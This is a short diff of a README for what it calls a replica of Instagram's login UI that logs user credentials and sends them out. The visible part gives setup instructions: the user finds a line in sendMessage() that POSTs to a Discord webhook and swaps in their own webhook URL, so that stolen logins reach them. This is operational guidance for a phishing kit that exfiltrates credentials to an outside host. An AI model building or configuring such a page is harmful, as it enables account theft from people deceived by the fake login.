@@ -40,6 +40,7 @@ This is a **replica of Instagram's login UI** that logs user credentials and sen
 ### 2. Update the Webhook URL
 
 Inside the `sendMessage()` function, look for this line:
+
 request.open("POST", "https://discord.com/api/webhooks/...");
 
 - Replace it with your actual Discord webhook URL. You can create one via:
